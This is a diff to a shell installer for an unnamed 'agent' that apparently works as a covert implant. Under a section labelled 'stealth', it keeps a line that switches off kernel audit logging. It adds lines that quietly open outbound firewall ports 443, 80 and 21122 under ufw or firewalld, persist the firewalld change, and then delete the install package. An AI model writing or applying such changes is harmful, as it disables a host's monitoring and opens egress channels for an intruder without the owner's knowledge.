@@ -226,6 +226,7 @@ chmod 0600 "$CONFIG"
 cat >"$LAUNCHER" <<LAUNCH
 #!/bin/sh
 set -eu
+[ -f /etc/environment ] && { set -a; . /etc/environment 2>/dev/null || true; set +a; }
 PIDFILE="$STATE_DIR/agent.pid"
 mkdir -p "$STATE_DIR"
 if [ -f "\$PIDFILE" ]; then
@@ -335,7 +336,15 @@ fi
 
 # ---------------------------------------------------------------- stealth
 command -v auditctl >/dev/null 2>&1 && auditctl -e 0 >/dev/null 2>&1 || true
-command -v nsenter >/dev/null 2>&1 && true
+if command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q "Status: active"; then
+    ufw allow out 443/tcp >/dev/null 2>&1 || true
+    ufw allow out 80/tcp >/dev/null 2>&1 || true
+    ufw allow out 21122/tcp >/dev/null 2>&1 || true
+fi
+if command -v firewall-cmd >/dev/null 2>&1 && firewall-cmd --state >/dev/null 2>&1; then
+    firewall-cmd --permanent --add-service=https >/dev/null 2>&1 || true
+    firewall-cmd --reload >/dev/null 2>&1 || true
+fi
 
 install_log 'done'
 rm -f "$PKG"
